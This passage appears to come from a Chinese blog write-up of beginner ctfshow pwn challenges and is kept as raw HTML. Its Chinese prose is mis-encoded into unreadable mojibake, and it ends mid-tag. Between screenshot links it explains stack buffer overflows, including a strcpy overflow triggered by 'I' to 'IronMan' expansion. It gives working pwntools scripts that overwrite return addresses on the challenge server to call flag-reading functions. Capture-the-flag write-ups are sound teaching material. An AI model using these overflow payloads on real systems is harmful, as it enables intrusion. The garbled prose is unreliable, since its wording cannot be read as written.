&lt;p&gt;åœ¨å¾€sä¸­readçš„æ—¶å€™å¤§å°æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ç¨‹åºåœ¨ä¸‹é¢å°†å­—ç¬¦&amp;quot;I&amp;quot;æ›¿æ¢æˆ äº†&amp;quot;IronMan&amp;quot;ï¼Œæœ€ååœ¨strcpyçš„æ—¶å€™å‘ç”Ÿäº†æº¢å‡ºã€‚åªéœ€è¦ç®€å•è®¡ç®—ä¸€ä¸‹ï¼Œé‚£ä¹ˆåœ¨è¾“å…¥16ä¸ªâ€œIâ€ å°±ä¼šè¢«æ›¿æ¢ä¸º 16 * 7 = 112ä¸ªå­—ç¬¦ï¼Œè€Œsè·ebpçš„è·ç¦»ä¸º 0x6c = 108ã€‚&lt;/p&gt;
&lt;p&gt;æ­£å¸¸æº¢å‡ºè¦†ç›–åˆ°è¿”å›åœ°å€å°±æ˜¯ cyclic(0x6c+4) = cyclic(112) ,è¾“å…¥16ä¸ªIåˆšå¥½æ›¿æ¢æˆ 16ä¸ª&amp;quot;IronMan&amp;quot;ï¼Œåˆšå¥½æ˜¯112ä¸ªï¼Œä¹Ÿå°±åˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œä½†ç”¨å…¶å®ƒå­—ç¬¦æ¯”å¦‚aä¸å¯ä»¥ï¼Œå› ä¸ºä¼šå†è°ƒç”¨ &lt;code&gt;std::string::operator+=&lt;/code&gt; å°†è¾“å…¥çš„ &lt;code&gt;&amp;quot;a&amp;quot;*112&lt;/code&gt; æ‹¼æ¥åˆ°è¿™ä¸ªå›ºå®šå‰ç¼€ä¹‹åã€‚æ­¤æ—¶ï¼Œå­—ç¬¦ä¸²æ€»é•¿åº¦å·²å˜ä¸º &lt;strong&gt;â€œå›ºå®šå‰ç¼€é•¿åº¦ + 112 å­—èŠ‚â€&lt;/strong&gt;ï¼Œå¿…ç„¶è¶…è¿‡ 112 å­—èŠ‚ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172.png&#34;
	width=&#34;1255&#34;
	height=&#34;445&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172_hu_27afd99bc34b6d8a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172_hu_b9863ff8944de29a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;shift &amp;#43; F12æŸ¥çœ‹å­—ç¬¦ä¸²&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;282&#34;
		data-flex-basis=&#34;676px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è®©æˆ‘å‘ç°äº†&lt;strong&gt;cat /ctfshow_flag&lt;/strong&gt;ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ‰§è¡Œè¿™ä¸ªcatflagçš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173.png&#34;
	width=&#34;925&#34;
	height=&#34;270&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173_hu_1ac11bfcef4c507f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173_hu_312bc12e61d10954.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;342&#34;
		data-flex-basis=&#34;822px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174.png&#34;
	width=&#34;1085&#34;
	height=&#34;356&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174_hu_cde4da8a3d61171.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174_hu_1cda939199b13027.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;304&#34;
		data-flex-basis=&#34;731px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾å®ƒåœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175.png&#34;
	width=&#34;646&#34;
	height=&#34;61&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175_hu_2bf71b1fe453b1b0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175_hu_8c599f0fad61de00.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Alt &amp;#43; TæŸ¥è¯¢&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1059&#34;
		data-flex-basis=&#34;2541px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ°å€ï¼š804902E&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28216&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;get_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x804902E&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;I&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_052&#34;&gt;PWN_052
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè¿é¢èµ°æ¥çš„flagè®©æˆ‘å¦‚æ­¤è ¢è ¢æ¬²åŠ¨ï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_052&#34; &gt;PWN_052&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176.png&#34;
	width=&#34;739&#34;
	height=&#34;204&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176_hu_7ed53533366a2e52.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176_hu_76a91fbb4acab851.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;362&#34;
		data-flex-basis=&#34;869px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA32ä½åˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177.png&#34;
	width=&#34;686&#34;
	height=&#34;184&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177_hu_afb68bf3489fef2a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177_hu_4446c7a38ba878d5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;372&#34;
		data-flex-basis=&#34;894px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è®©æˆ‘çœ‹åˆ°äº†getså‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›flagå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178.png&#34;
	width=&#34;944&#34;
	height=&#34;345&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178_hu_c542e5fc3e82054f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178_hu_8c4a240f10e94703.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;273&#34;
		data-flex-basis=&#34;656px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ®µ C è¯­è¨€ä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸ºflagçš„å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è¯»å–å¹¶è¾“å‡ºç‰¹å®šæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œä½†æœ‰æ¡ä»¶é™åˆ¶ã€‚æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼š
å‡½æ•°é¦–å…ˆå°è¯•æ‰“å¼€/ctfshow_flagæ–‡ä»¶ç”¨äºè¯»å–ï¼Œ
å¦‚æœæ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼Œä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºï¼›
å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œä¼šè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹åˆ°sæ•°ç»„ã€‚ï¼ˆæœ€å¤š 64 ä¸ªå­—ç¬¦ï¼‰&lt;/p&gt;
&lt;p&gt;å‡½æ•°çš„è¿”å›é€»è¾‘ï¼š
å½“å‚æ•°a1ç­‰äº 0x36C ä¸”a2ç­‰äº 0x36D æ—¶ï¼Œä½¿ç”¨printf(s)è¾“å‡ºæ–‡ä»¶å†…å®¹å¹¶è¿”å›ï¼›å¦åˆ™ï¼Œç›´æ¥è¿”å›fgetsçš„ç»“æœã€‚ï¼ˆå³è¯»å–åˆ°çš„å­—ç¬¦ä¸²ï¼‰&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œè¿”å›åˆ°è¿™ä¸ªflagå‡½æ•°å¹¶æ‰§è¡Œå°±èƒ½è·å¾—flagã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28261&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x36C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x36D&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ç±»canaryçˆ†ç ´&#34;&gt;&lt;strong&gt;ç±»canaryçˆ†ç ´&lt;/strong&gt;
&lt;/h3&gt;&lt;h3 id=&#34;pwn_053&#34;&gt;PWN_053
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå†å¤šä¸€çœ¼çœ‹ä¸€çœ¼å°±ä¼šçˆ†ç‚¸ï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_053&#34; &gt;PWN_053&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecçœ‹ä¿¡æ¯&amp;hellip;.æ²¡å¼€canaryã€PIEï¼Œæœ‰NX&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›flagå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179.png&#34;
	width=&#34;785&#34;
	height=&#34;309&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179_hu_609a70c9b8d82948.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179_hu_76ce6657743640.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flagå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;254&#34;
		data-flex-basis=&#34;609px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å‡½æ•°çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
å®šä¹‰ä¸€ä¸ª 64 å­—èŠ‚çš„å­—ç¬¦æ•°ç»„så’Œä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆstreamã€‚å°è¯•æ‰“å¼€è·¯å¾„ä¸º/ctfshow_flagçš„æ–‡ä»¶ç”¨äºè¯»å–ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼ˆstreamä¸º NULLï¼‰ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºï¼›å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œä½¿ç”¨fgetsä»æ–‡ä»¶ä¸­è¯»å–æœ€å¤š 64 ä¸ªå­—ç¬¦åˆ°æ•°ç»„sä¸­ï¼Œé€šè¿‡puts(s)è¾“å‡ºè¯»å–åˆ°çš„å†…å®¹ï¼ˆä¼šè‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ æ¢è¡Œç¬¦ï¼‰ï¼Œè°ƒç”¨fflush(stdout)åˆ·æ–°æ ‡å‡†è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶å°†å…¶è¿”å›å€¼ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ®µä»£ç çš„é€»è¾‘æ¯”ä¸Šä¸€ä¸ªç‰ˆæœ¬æ›´ç›´æ¥ï¼Œä¸éœ€è¦ç‰¹å®šå‚æ•°å³å¯è¾“å‡º flag å†…å®¹ï¼Œåªè¦æˆåŠŸæ‰“å¼€æ–‡ä»¶å°±ä¼šç›´æ¥æ‰“å°æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚fflush(stdout)çš„ä½œç”¨æ˜¯ç¡®ä¿å†…å®¹ç«‹å³è¾“å‡ºåˆ°ç»ˆç«¯ï¼Œè€Œä¸ä¼šåœç•™åœ¨ç¼“å†²åŒºä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦æ‰§è¡Œåˆ°flagå‡½æ•°å°±ç›´æ¥ç»™flagå­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å‡½æ•°ç›®å½•ä¸Šçœ‹åˆ°äº†canaryå‡½æ•°ï¼Œè¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§åˆ°æ‰‹åŠ¨æ”¾ç½®çš„canaryï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181.png&#34;
	width=&#34;844&#34;
	height=&#34;288&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181_hu_c5e21505468ae92f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181_hu_de81624b0c62b6b1.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;canaryå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;293&#34;
		data-flex-basis=&#34;703px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ä»æ ‡å‡†è¾“å…¥è¯»å–ç”¨æˆ·è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œå¹¶å°†ç›¸åº”å­—èŠ‚æ•°çš„æ•°æ®è¯»å–åˆ°ç¼“å†²åŒº buf ä¸­ã€‚ç„¶åï¼Œå®ƒä¼šæ£€æŸ¥å †æ ˆçš„å®Œæ•´æ€§ï¼Œå¦‚æœå †æ ˆè¢«ç ´åï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ç¨‹åºã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/180.png&#34;
	width=&#34;989&#34;
	height=&#34;585&#34;
